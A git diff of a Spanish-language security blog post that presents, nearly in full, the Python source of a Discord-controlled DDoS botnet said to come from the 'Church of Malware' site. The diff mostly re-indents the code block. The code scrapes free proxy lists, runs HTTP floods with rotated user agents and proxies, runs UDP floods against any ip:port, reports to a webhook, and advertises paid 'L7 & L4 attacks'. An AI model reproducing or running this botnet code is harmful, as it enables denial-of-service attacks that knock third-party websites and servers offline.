@@ -40,7 +40,7 @@
         <!-- Lista de Entradas del Blog -->
         <section class="blog-list">
 
-            <article class="blog-card">
+                <article class="blog-card">
                 <div class="blog-card-header">
                     <span class="blog-date">[2026-10-14]</span>
                     <span class="status-tag dev">BOTNET</span>
@@ -50,445 +50,453 @@
                     <p>
                         Navegando por la red hace un tiempo encontré una página realmente interesante, <a href="https://churchofmalware.org/" target="_blank" rel="noopener noreferrer">Church of Malware</a>, una organización sin ánimo de lucro enfocada en la investigación libre de ciberseguridad ofensiva y educación en seguridad, la cual hacía mucho hincapié en el análisis de códigos maliciosos y en entender el control de internet desde la perspectiva del consumidor. Me pareció un proyecto fascinante y te recomiendo echarle un vistazo.
                     </p>
-                    <p>
-                        <img src="/churchofmalware.png" alt="Church of Malware Screenshot" style="max-width: 50%; border-radius: 4px; margin-top: 10px;" />
-                    </p>
+                    <div class="blog-img-container">
+                        <img src="churchofmalware.png" alt="Church of Malware Screenshot" />
+                    </div>
                     <p>
                         Investigando en esta plataforma encontré referencias y fragmentos de código de distintos tipos de malware, como gusanos, ransomware, crypto miners, o lo que más llamó mi atención: una botnet rudimentaria basada en Discord.
                     </p>
-                    <div class="code-scroll-box">
-                        <pre class="code-block"><code>
-                            import os
-                            import aiohttp
-                            import asyncio
-                            import requests
-                            import threading
-                            import discord
-                            import argparse
-                            import socket
-                            import time
-                            import random
-                            import lxml
-                            from lxml.html import fromstring
-                            from discord.ext import commands
+                    
+                    <div class="code-container">
+                        <div class="code-header">
+                            <span class="code-filename">botnet_discord.py</span>
+                            <span class="code-lang">PYTHON</span>
+                        </div>
+                        <div class="code-scroll-box">
+                            <pre class="code-block"><code>
+import os
+import aiohttp
+import asyncio
+import requests
+import threading
+import discord
+import argparse
+import socket
+import time
+import random
+import lxml
+from lxml.html import fromstring
+from discord.ext import commands
 
-                            finals = []
+finals = []
 
-                            bot = commands.Bot(command_prefix="$", help_command=None, intents=discord.Intents.all())
-                            if __name__ == "__main__":
-                                parser = argparse.ArgumentParser(description="Boatnet")
-                                parser.add_argument("-s", "--server", type=int, help="server number")
-                                args = parser.parse_args()
-                                server = args.server
+bot = commands.Bot(command_prefix="$", help_command=None, intents=discord.Intents.all())
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(description="Boatnet")
+    parser.add_argument("-s", "--server", type=int, help="server number")
+    args = parser.parse_args()
+    server = args.server
 
-                            webhook = "[REDACTED_DISCORD_WEBHOOK]"
+webhook = "[REDACTED_DISCORD_WEBHOOK]"
 
-                            data = {
-                                "content" : "",
-                                "username" : f"Server {server}"
-                            }
+data = {
+    "content" : "",
+    "username" : f"Server {server}"
+}
 
-                            data["embeds"] = [
-                                {
-                                    "description" : "Type `$help` For Help.",
-                                    "title" : f":white_check_mark: Server {server} Started Up!"
-                                }
-                            ]
+data["embeds"] = [
+    {
+        "description" : "Type `$help` For Help.",
+        "title" : f":white_check_mark: Server {server} Started Up!"
+    }
+]
 
-                            stopset = False
-
-
-                            class proxygen:
-                                def checkdupes(proxies):
-                                    ok = []
-                                    for proxy in proxies:
-                                        if proxy not in ok:
-                                            ok.append(proxy)
-                                    return ok
-
-                                def scraper():
-                                    url = 'https://sslproxies.org/'
-                                    response = requests.get(url)
-                                    parser = fromstring(response.text)
-                                    proxies = []
-                                    for i in parser.xpath('//tbody/tr')[:100]:
-                                        if i.xpath('.//td[7][contains(text(),"yes")]'):
-                                            proxy = ":".join([i.xpath('.//td[1]/text()')[0], i.xpath('.//td[2]/text()')[0]])
-                                            proxies.append(proxy)
-
-                                    url2 = 'https://free-proxy-list.net/'
-                                    response = requests.get(url2)
-                                    parser2 = fromstring(response.text)
-                                    for i in parser2.xpath('//tbody/tr')[:200]:
-                                        if i.xpath('.//td[7][contains(text(),"yes")]'):
-                                            proxy = ":".join([i.xpath('.//td[1]/text()')[0], i.xpath('.//td[2]/text()')[0]])
-                                            proxies.append(proxy)
-                                    url3 = 'https://www.us-proxy.org/'
-
-                                    response = requests.get(url3)
-                                    parser3 = fromstring(response.text)
-                                    for i in parser3.xpath('//tbody/tr')[:200]:
-                                        if i.xpath('.//td[7][contains(text(),"yes")]'):
-                                            proxy = ":".join([i.xpath('.//td[1]/text()')[0], i.xpath('.//td[2]/text()')[0]])
-                                            proxies.append(proxy)
-
-                                    url4 = "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt"
-                                    response = requests.get(url4)
-                                    for line in response.iter_lines(): 
-                                        if line: proxies.append(line.decode('utf-8'))
-
-                                    url5 = "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt"
-                                    response = requests.get(url5)
-                                    for line in response.iter_lines(): 
-                                        if line: proxies.append(line.decode('utf-8'))
-
-                                    url6 = "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt"
-                                    response = requests.get(url6)
-                                    for line in response.iter_lines(): 
-                                        if line: proxies.append(line.decode('utf-8')) 
-
-                                    url7 = "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt"
-                                    response = requests.get(url7)
-                                    for line in response.iter_lines(): 
-                                        if line: proxies.append(line.decode('utf-8'))
-
-                                    url8 = "https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt"
-                                    response = requests.get(url8)
-                                    for line in response.iter_lines(): 
-                                        if line: proxies.append(line.decode('utf-8'))
-
-                                    url9 = "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt"
-                                    response = requests.get(url9)
-                                    for line in response.iter_lines(): 
-                                        if line: proxies.append(line.decode('utf-8')) 
-
-                                    url10 = "https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/http.txt"
-                                    response = requests.get(url10)
-                                    for line in response.iter_lines(): 
-                                        if line: proxies.append(line.decode('utf-8')) 
-                                    return proxies
-
-                                async def check(proxies, mtime):
-                                    valids = []
-                                    async def a1337(proxy):
-                                        async with aiohttp.ClientSession() as session:
-                                            try:
-                                                async with session.get("http://www.google.com", proxy=f"http://{proxy}", timeout=int(mtime)) as r:
-                                                    valids.append(proxy)
-                                            except Exception as e:
-                                                pass
-                                    tasks = []
-                                    for proxy in proxies:
-                                        tasks.append(a1337(proxy))
-                                    await asyncio.gather(*tasks)
-                                    return valids
-
-                            @bot.event
-                            async def on_ready():
-                                result = requests.post(webhook, json = data)
-
-                            @bot.command()
-                            async def help(ctx):
-                                if int(server) == 1:
-                                    embed = discord.Embed(title="Help", description="[REDACTED_BOTNET_NAME]", colour=discord.Colour.green())
-                                    embed.add_field(name="What Is This", value=f"This Is A Botnet Provided You By The [REDACTED_TEAM_NAME].", inline=False)
-                                    embed.add_field(name="Why", value=f"We are currently developing a Botnet that runs over PuTTY.\nAnd Because The PuTTY Botnet Doesnt Work Currently, We Made This.\nAnd Also Just 4 Fun :)", inline=False)
-                                    embed.add_field(name="What Can I Do", value=f"You Can See The Command list with `$methods`. (Note: Some Commands Are Private/Payed)", inline=False)
-                                    embed.set_footer(text="Help Command | L7 & L4 Attacks Provided By [REDACTED] | Praise [REDACTED] | [REDACTED_DISCORD_INVITE]")
-                                    await ctx.reply(embed=embed)
-
-                            komplett = """┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼
-                            ┼┼┼┼┼┼┼┼██┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼██┼┼┼┼┼┼┼┼┼
-                            ┼┼┼┼┼┼████▄┼┼┼▄▄▄▄▄▄▄┼┼┼▄████┼┼┼┼┼┼┼
-                            ┼┼┼┼┼┼┼┼┼▀▀█▄█████████▄█▀▀┼┼┼┼┼┼┼┼┼┼
-                            ┼┼┼┼┼┼┼┼┼┼┼█████████████┼┼┼┼┼┼┼┼┼┼┼┼
-                            ┼┼┼┼┼┼┼┼┼┼┼██▀▀▀███▀▀▀██┼┼┼┼┼┼┼┼┼┼┼┼
-                            ┼┼┼┼┼┼┼┼┼┼┼██┼┼┼███┼┼┼██┼┼┼┼┼┼┼┼┼┼┼┼
-                            ┼┼┼┼┼┼┼┼┼┼┼█████▀▄▀█████┼┼┼┼┼┼┼┼┼┼┼┼
-                            ┼┼┼┼┼┼┼┼┼┼┼┼███████████┼┼┼┼┼┼┼┼┼┼┼┼┼
-                            ┼┼┼┼┼┼┼┼▄▄▄██┼┼█▀█▀█┼┼██▄▄▄┼┼┼┼┼┼┼┼┼
-                            ┼┼┼┼┼┼┼┼▀▀██┼┼┼┼┼┼┼┼┼┼┼██▀▀┼┼┼┼┼┼┼┼┼
-                            ┼┼┼┼┼┼┼┼┼┼▀▀┼┼┼┼┼┼┼┼┼┼┼▀▀┼┼┼┼┼┼┼┼┼┼┼
-                            ┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼
-                            """
-
-                            meth = """ _______ _______ _______ _     _  _____  ______  _______
-                            |  |  | |______    |    |_____| |     | |     \ |______
-                            |  |  | |______    |    |     | |_____| |_____/ ______|
-                            """
-
-                            stre = """____ ___ ___ ____ ____ _  _    ____ ___ ____ ____ _  _ ____ ___ _  _ 
-                            |__|  |   |  |__| |    |_/     [__   |  |__/ |___ |\ | | __  |  |__| 
-                            |  |  |   |  |  | |___ | \_    ___]  |  |  \ |___ | \| |__]  |  |  | 
-                            """
+stopset = False
 
 
-                            @bot.command()
-                            async def methods(ctx):
-                                if int(server) == 1:
-                                    embed = discord.Embed(title="**𝙼𝙴𝚃𝙷𝙾𝙳𝚂**", description=f"```{meth}```\n```{komplett}```", colour=discord.Colour.green())
-                                    embed.add_field(name="`customhttp` **Private**", value=f"Custom HTTP Flood.\n**𝚄𝚂𝙰𝙶𝙴:**\n`$customhttp <threads> <times> <semaphore> <bypasscheck (0 for no bypass 1 for bypass)> <servers/concurrents> <website>`", inline=True)
-                                    embed.add_field(name="`http` **Free**", value=f"Strong HTTP Flood.\n**𝚄𝚂𝙰𝙶𝙴:**\n`$http <servers/concurrents (maximum of 50)> <website>`", inline=True)
-                                    embed.add_field(name="`customudp` **Private**", value=f"Custom UDP Flood.\n**𝚄𝚂𝙰𝙶𝙴:**\n`$customudp <ip:port> <Packet Strength (maximum 147)> <threads> <Packets Per Thread> <servers/concurrents>`", inline=True)
-                                    embed.add_field(name="`udp` **Free**", value=f"Strong UDP Flood.\n**𝚄𝚂𝙰𝙶𝙴:**\n`$udp <servers/concurrents (maximum of 50)> <ip:port>`", inline=True)
-                                    embed.add_field(name=f"```{stre}```", value=f"**customhttp**\n`Up to 1.5k/server.`\n**http**\n`Up to 2k+/server.`\n**customudp**\n`Up to 7.5 Gbit/s / 15 servers.`\n**udp**\n`Same As Customudp.`", inline=False)
-                                    embed.set_footer(text="METHODS | L7 & L4 Attacks Provided By [REDACTED] | Praise [REDACTED] | [REDACTED_DISCORD_INVITE]")
-                                    await ctx.reply(embed=embed)
+class proxygen:
+    def checkdupes(proxies):
+        ok = []
+        for proxy in proxies:
+            if proxy not in ok:
+                ok.append(proxy)
+        return ok
 
-                            canuseproxies = []
+    def scraper():
+        url = 'https://sslproxies.org/'
+        response = requests.get(url)
+        parser = fromstring(response.text)
+        proxies = []
+        for i in parser.xpath('//tbody/tr')[:100]:
+            if i.xpath('.//td[7][contains(text(),"yes")]'):
+                proxy = ":".join([i.xpath('.//td[1]/text()')[0], i.xpath('.//td[2]/text()')[0]])
+                proxies.append(proxy)
 
-                            art = """
-                            _____   ______  _____  _     _ _____ _______ _______
-                            |_____] |_____/ |     |  \___/    |   |______ |______
-                            |       |    \_ |_____| _/   \_ __|__ |______ ______|
+        url2 = 'https://free-proxy-list.net/'
+        response = requests.get(url2)
+        parser2 = fromstring(response.text)
+        for i in parser2.xpath('//tbody/tr')[:200]:
+            if i.xpath('.//td[7][contains(text(),"yes")]'):
+                proxy = ":".join([i.xpath('.//td[1]/text()')[0], i.xpath('.//td[2]/text()')[0]])
+                proxies.append(proxy)
+        url3 = 'https://www.us-proxy.org/'
 
-                            """
+        response = requests.get(url3)
+        parser3 = fromstring(response.text)
+        for i in parser3.xpath('//tbody/tr')[:200]:
+            if i.xpath('.//td[7][contains(text(),"yes")]'):
+                proxy = ":".join([i.xpath('.//td[1]/text()')[0], i.xpath('.//td[2]/text()')[0]])
+                proxies.append(proxy)
 
-                            @bot.command()
-                            async def load(ctx, check, maxtime):
-                                global finals
-                                if int(server) == 1:
-                                    if check == "http":
-                                        embed = discord.Embed(title="**PROXIES**", description=f"`{art}`\n𝚂𝚃𝙰𝚃𝚄𝚂:\n`Scraping` 0/4:white_check_mark:", colour=discord.Colour.green())
-                                        msg = await ctx.reply(embed=embed)
-                                        prox = proxygen.scraper()
-                                        embed = discord.Embed(title="**PROXIES**", description=f"`{art}`\n𝚂𝚃𝙰𝚃𝚄𝚂:\n`Checking` 1/4:white_check_mark:", colour=discord.Colour.green())
-                                        await msg.edit(embed=embed)
-                                        canuseproxies = await proxygen.check(prox, int(maxtime))
-                                        embed = discord.Embed(title="**PROXIES**", description=f"`{art}`\n𝚂𝚃𝙰𝚃𝚄𝚂:\n`Checking Dupes` 2/4:white_check_mark:", colour=discord.Colour.green())
-                                        await msg.edit(embed=embed)
-                                        start = len(canuseproxies)
-                                        finals = proxygen.checkdupes(canuseproxies)
-                                        end = len(finals)
-                                        embed = discord.Embed(title="**PROXIES**", description=f"`{art}`\n𝚂𝚃𝙰𝚃𝚄𝚂:\n`Overwritting` 3/4:white_check_mark:", colour=discord.Colour.green())
-                                        await msg.edit(embed=embed)
-                                        time.sleep(0.2)
-                                        embed = discord.Embed(title="**PROXIES**", description=f"`{art}`\n𝚂𝚃𝙰𝚃𝚄𝚂:\n`Done!` 4/4:white_check_mark:\nScraped `{len(finals)}` Proxies.\n`{maxtime}s` Proxy Cooldown.\n `{start - end}` Dupes Erased.", colour=discord.Colour.green())
-                                        await msg.edit(embed=embed)
-                                else:
-                                    if check == "http":
-                                        prox = proxygen.scraper()
-                                        canuseproxies = await proxygen.check(prox, int(maxtime))
-                                        finals = proxygen.checkdupes(canuseproxies)
+        url4 = "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt"
+        response = requests.get(url4)
+        for line in response.iter_lines(): 
+            if line: proxies.append(line.decode('utf-8'))
 
-                            @bot.command()
-                            async def unload(ctx, check):
-                                global finals
-                                if int(server) == 1:
-                                    if check == "http":
-                                        beforeunload = finals
-                                        finals = []
-                                        embed = discord.Embed(title="Unloaded Proxies", description=f"`{len(beforeunload)}` Proxies Were Unloaded.", colour=discord.Colour.green())
-                                        beforeunload = None
-                                        await ctx.reply(embed=embed)
-                                else:
-                                    if check == "http":
-                                        finals = []
+        url5 = "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt"
+        response = requests.get(url5)
+        for line in response.iter_lines(): 
+            if line: proxies.append(line.decode('utf-8'))
 
-                            @bot.command()
-                            async def customhttp(ctx, threads, times, sema, bypasscheck, srvrs, http):
-                                global finals
-                                if int(srvrs) > int(server) or int(srvrs) == int(server):
-                                    if int(srvrs) == server:
-                                        if bypasscheck == "1":
-                                            embed = discord.Embed(title="Sent", description="Attack Has Been Sent.", colour=discord.Colour.green())
-                                            embed.add_field(name="Attack Info", value=f"Attack Type: `L7 ~ Custom`\nWebsite: `{http}`\nThreads: `{threads}`\nRequests Per Thread: `{times}`\nSemaphore: `{sema}`\nServers/Concurrents: `{srvrs}`\nBypass: `True`")
-                                            embed.set_footer(text="L7 Attack Sent | L7 & L4 Attacks Provided By [REDACTED] | Praise [REDACTED] | [REDACTED_DISCORD_INVITE]")
-                                            await ctx.send(embed=embed)
-                                        else:
-                                            embed = discord.Embed(title="Sent", description="Attack Has Been Sent.", colour=discord.Colour.green())
-                                            embed.add_field(name="Attack Info", value=f"Attack Type: `L7 ~ Custom`\nWebsite: `{http}`\nThreads: `{threads}`\nRequests Per Thread: `{times}`\nSemaphore: `{sema}`\nServers/Concurrents: `{srvrs}`\nBypass: `False`")
-                                            embed.set_footer(text="L7 Attack Sent | L7 & L4 Attacks Provided By [REDACTED] | Praise [REDACTED] | [REDACTED_DISCORD_INVITE]")
-                                            await ctx.send(embed=embed)
-                                    sem = asyncio.Semaphore(int(sema))
+        url6 = "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt"
+        response = requests.get(url6)
+        for line in response.iter_lines(): 
+            if line: proxies.append(line.decode('utf-8')) 
 
-                                    if bypasscheck == "1":
-                                        if finals != []:
-                                            async def siekyle(useragent, platform, proxy):
-                                                async with aiohttp.ClientSession() as session:
-                                                    async with sem:
-                                                        for _ in range(int(times)):
-                                                            try:
-                                                                await session.get(http, headers={"User-Agent": useragent, "Sec-Ch-Ua-Platform": platform}, proxy=f"http://{proxy}")
-                                                            except: await session.get(http, headers={"User-Agent": useragent, "Sec-Ch-Ua-Platform": platform})
-                                        else:
-                                            async def siekyle(useragent, platform, proxy):
-                                                async with aiohttp.ClientSession() as session:
-                                                    async with sem:
-                                                        for _ in range(int(times)):
-                                                            await session.get(http, headers={"User-Agent": useragent, "Sec-Ch-Ua-Platform": platform})
+        url7 = "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt"
+        response = requests.get(url7)
+        for line in response.iter_lines(): 
+            if line: proxies.append(line.decode('utf-8'))
 
-                                    elif bypasscheck == "0":
-                                        async def siekyle():
-                                            async with aiohttp.ClientSession() as session:
-                                                async with sem:
-                                                    for _ in range(int(times)):
-                                                        await session.get(http)
+        url8 = "https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt"
+        response = requests.get(url8)
+        for line in response.iter_lines(): 
+            if line: proxies.append(line.decode('utf-8'))
 
-                                    else:
-                                        print(f"Invalid BypassCheck at Function Defining -> <{str(bypasscheck)}>: should be 0 or 1.")
+        url9 = "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt"
+        response = requests.get(url9)
+        for line in response.iter_lines(): 
+            if line: proxies.append(line.decode('utf-8')) 
 
-                                    tasks = []
-                                    if bypasscheck == "1":
-                                        base_user_agents = [
-                                'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Firefox/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
-                                'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Chrome/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
-                                'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Safari/%.1f.%.1f',
-                                'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Chrome/%.1f.%.1f',
-                                'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Firefox/%.1f.%.1f',
-                            ]           
-                                        platforms = ["Windows", "Linux", "MacOS"]
-                                        def rand_ua():
-                                            return random.choice(base_user_agents) % (random.random() + 5, random.random() + random.randint(1, 8), random.random(), random.randint(2000, 2100), random.randint(92215, 99999), (random.random() + random.randint(3, 9)), random.random())
-                                        def rand_pl():
-                                            return random.choice(platforms)
-                                        def rand_pr():
-                                            if finals != []:
-                                                return random.choice(finals)
-                                            else: return "kompletterino"
-                                        for i in range(int(threads)):
-                                            tasks.append(siekyle(rand_ua(), rand_pl(), rand_pr()))
-                                        await asyncio.gather(*tasks)
+        url10 = "https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/http.txt"
+        response = requests.get(url10)
+        for line in response.iter_lines(): 
+            if line: proxies.append(line.decode('utf-8')) 
+        return proxies
 
-                                    elif bypasscheck == "0":
-                                        for i in range(int(threads)):
-                                            tasks.append(siekyle())
-                                        await asyncio.gather(*tasks)
-                                    else:
-                                        print(f"Invalid BypassCheck at Thread Defining -> <{str(bypasscheck)}>: should be 0 or 1.")
+    async def check(proxies, mtime):
+        valids = []
+        async def a1337(proxy):
+            async with aiohttp.ClientSession() as session:
+                try:
+                    async with session.get("http://www.google.com", proxy=f"http://{proxy}", timeout=int(mtime)) as r:
+                        valids.append(proxy)
+                except Exception as e:
+                    pass
+        tasks = []
+        for proxy in proxies:
+            tasks.append(a1337(proxy))
+        await asyncio.gather(*tasks)
+        return valids
 
-                            @bot.command()
-                            async def http(ctx, srvrs, http):
-                                global finals
-                                global stopset
-                                if stopset:
-                                    stopset = False
-                                if int(srvrs) > int(server) or int(srvrs) == int(server) and int(srvrs) < 50 or int(srvrs) == 50:
-                                    global finals
-                                    if int(srvrs) == server:
-                                        embed = discord.Embed(title="Sent", description="Attack Has Been Sent.", colour=discord.Colour.green())
-                                        embed.add_field(name="Attack Info", value=f"Attack Type: `L7 ~ Normal`\nWebsite: `{http}`\nServers/Concurrents: `{srvrs}`")
-                                        embed.set_footer(text="L7 Attack Sent | L7 & L4 Attacks Provided By [REDACTED] | Praise [REDACTED] | [REDACTED_DISCORD_INVITE]")
-                                        await ctx.send(embed=embed)
-                                    sem = asyncio.Semaphore(2500)
-                                    if finals != []:
-                                        async def siekyle(http, useragent, platform, proxy):
-                                            async with aiohttp.ClientSession() as session:
-                                                async with sem:
-                                                    for _ in range(200):
-                                                        while not stopset:
-                                                            await session.get(http, headers={"User-Agent": useragent, "Sec-Ch-Ua-Platform": platform}, proxy=f"http://{proxy}")
-                                                            if stopset: break
-                                    else:
-                                        async def siekyle(http, useragent, platform, proxy):
-                                            async with aiohttp.ClientSession() as session:
-                                                async with sem:
-                                                    for _ in range(200):
-                                                        while not stopset:
-                                                            await session.get(http, headers={"User-Agent": useragent, "Sec-Ch-Ua-Platform": platform})
-                                                            if stopset: break
+@bot.event
+async def on_ready():
+    result = requests.post(webhook, json = data)
 
-                                    platforms = ["Windows", "Linux", "MacOS"]
-                                    base_user_agents = [
-                                'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Firefox/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
-                                'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Chrome/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
-                                'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Safari/%.1f.%.1f',
-                                'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Chrome/%.1f.%.1f',
-                                'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Firefox/%.1f.%.1f',
-                            ]
-                                    tasks = []
-                                    def rand_ua():
-                                        return random.choice(base_user_agents) % (random.random() + 5, random.random() + random.randint(1, 8), random.random(), random.randint(2000, 2100), random.randint(92215, 99999), (random.random() + random.randint(3, 9)), random.random())
-                                    def rand_pl():
-                                        return random.choice(platforms)
-                                    def rand_pr():
-                                        if finals != []:
-                                            return random.choice(finals)
-                                        else: return "kompletterino"
-                                    for i in range(2000):
-                                        tasks.append(siekyle(http, rand_ua(), rand_pl(), rand_pr()))
-                                    await asyncio.gather(*tasks)
+@bot.command()
+async def help(ctx):
+    if int(server) == 1:
+        embed = discord.Embed(title="Help", description="[REDACTED_BOTNET_NAME]", colour=discord.Colour.green())
+        embed.add_field(name="What Is This", value=f"This Is A Botnet Provided You By The [REDACTED_TEAM_NAME].", inline=False)
+        embed.add_field(name="Why", value=f"We are currently developing a Botnet that runs over PuTTY.\nAnd Because The PuTTY Botnet Doesnt Work Currently, We Made This.\nAnd Also Just 4 Fun :)", inline=False)
+        embed.add_field(name="What Can I Do", value=f"You Can See The Command list with `$methods`. (Note: Some Commands Are Private/Payed)", inline=False)
+        embed.set_footer(text="Help Command | L7 & L4 Attacks Provided By [REDACTED] | Praise [REDACTED] | [REDACTED_DISCORD_INVITE]")
+        await ctx.reply(embed=embed)
 
-                            @bot.command()
-                            async def customudp(ctx, tshit, atcks, pks, pks2, srvrs):
-                                thost, tport = tshit.split(":")
-                                if int(srvrs) > int(server) or int(srvrs) == int(server):
-                                    if int(srvrs) == server:
-                                        embed = discord.Embed(title="Sent", description="Attack Has Been Sent.", colour=discord.Colour.green())
-                                        embed.add_field(name="Attack Info", value=f"Attack Type: `L4 ~ Custom`\nTarget: `{thost}:{tport}`\nPacket Stength: `{atcks}`\nThreads: `{pks}`\nExtra Packets: `{pks2}`\nServers/Concurrents: `{srvrs}`")
-                                        embed.set_footer(text="L4 Attack Sent | L7 & L4 Attacks Provided By [REDACTED] | Praise [REDACTED] | [REDACTED_DISCORD_INVITE]")
-                                        await ctx.send(embed=embed)
-                                    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+komplett = """┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼
+┼┼┼┼┼┼┼┼██┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼██┼┼┼┼┼┼┼┼┼
+┼┼┼┼┼┼████▄┼┼┼▄▄▄▄▄▄▄┼┼┼▄████┼┼┼┼┼┼┼
+┼┼┼┼┼┼┼┼┼▀▀█▄█████████▄█▀▀┼┼┼┼┼┼┼┼┼┼
+┼┼┼┼┼┼┼┼┼┼┼█████████████┼┼┼┼┼┼┼┼┼┼┼┼
+┼┼┼┼┼┼┼┼┼┼┼██▀▀▀███▀▀▀██┼┼┼┼┼┼┼┼┼┼┼┼
+┼┼┼┼┼┼┼┼┼┼┼██┼┼┼███┼┼┼██┼┼┼┼┼┼┼┼┼┼┼┼
+┼┼┼┼┼┼┼┼┼┼┼█████▀▄▀█████┼┼┼┼┼┼┼┼┼┼┼┼
+┼┼┼┼┼┼┼┼┼┼┼┼███████████┼┼┼┼┼┼┼┼┼┼┼┼┼
+┼┼┼┼┼┼┼┼▄▄▄██┼┼█▀█▀█┼┼██▄▄▄┼┼┼┼┼┼┼┼┼
+┼┼┼┼┼┼┼┼▀▀██┼┼┼┼┼┼┼┼┼┼┼██▀▀┼┼┼┼┼┼┼┼┼
+┼┼┼┼┼┼┼┼┼┼▀▀┼┼┼┼┼┼┼┼┼┼┼▀▀┼┼┼┼┼┼┼┼┼┼┼
+┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼┼
+"""
 
-                                    letterlist = ["@", "#", "-", ".", ",", "?", "S", ";", "\0", ">", "=", "/"]
-                                    def shit():
-                                        i1 = random.choice(letterlist)
-                                        i2 = random.choice(letterlist)
-                                        i3 = random.choice(letterlist)
-                                        i4 = random.choice(letterlist)
-                                        i5 = random.choice(letterlist) * 6
-                                        data = f"{i1}{i2}{i5}{i3}{i4}" * int(atcks)
-                                        data = data.encode('utf-8')
-                                        for _ in range(int(pks2)):
-                                            udp_socket.sendto(data, (str(thost), int(tport)))
-                                    for i in range(int(pks)):
-                                        threading.Thread(target=shit()).start()
+meth = """ _______ _______ _______ _     _  _____  ______  _______
+|  |  | |______    |    |_____| |     | |     \ |______
+|  |  | |______    |    |     | |_____| |_____/ ______|
+"""
 
-                            @bot.command()
-                            async def udp(ctx, srvrs, tshit):
-                                thost, tport = tshit.split(":")
-                                if int(srvrs) > int(server) or int(srvrs) == int(server) and int(srvrs) < 50 or int(srvrs) == 50:
-                                    if int(srvrs) > int(server) or int(srvrs) == int(server):
-                                        if int(srvrs) == server:
-                                            embed = discord.Embed(title="Sent", description="Attack Has Been Sent.", colour=discord.Colour.green())
-                                            embed.add_field(name="Attack Info", value=f"Attack Type: `L4 ~ Normal`\nTarget: `{thost}:{tport}\n`Servers/Concurrents: `{srvrs}`")
-                                            embed.set_footer(text="L4 Attack Sent | L7 & L4 Attacks Provided By [REDACTED] | Praise [REDACTED] | [REDACTED_DISCORD_INVITE]")
-                                            await ctx.send(embed=embed)
-                                        udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+stre = """____ ___ ___ ____ ____ _  _    ____ ___ ____ ____ _  _ ____ ___ _  _ 
+|__|  |   |  |__| |    |_/     [__   |  |__/ |___ |\ | | __  |  |__| 
+|  |  |   |  |  | |___ | \_    ___]  |  |  \ |___ | \| |__]  |  |  | 
+"""
 
-                                        letterlist = ["@", "#", "-", ".", ",", "?", "S", ";", "\0", ">", "=", "/"]
-                                        def shit():
-                                            i1 = random.choice(letterlist)
-                                            i2 = random.choice(letterlist)
-                                            i3 = random.choice(letterlist)
-                                            i4 = random.choice(letterlist)
-                                            i5 = random.choice(letterlist) * 6
-                                            data = f"{i1}{i2}{i5}{i3}{i4}" * 147
-                                            data = data.encode('utf-8')
-                                            for _ in range(1550):
-                                                udp_socket.sendto(data, (str(thost), int(tport)))
-                                        for i in range(1000):
-                                            threading.Thread(target=shit()).start()
 
-                            @bot.command()
-                            async def restart(ctx):
-                                if int(server) == 1:
-                                    embed = discord.Embed(title="RESTART:closed_lock_with_key:", description="All servers are getting Restarted.", colour=discord.Colour.green())
-                                    await ctx.reply(embed=embed)
+@bot.command()
+async def methods(ctx):
+    if int(server) == 1:
+        embed = discord.Embed(title="**𝙼𝙴𝚃𝙷𝙾𝙳𝚂**", description=f"```{meth}```\n```{komplett}```", colour=discord.Colour.green())
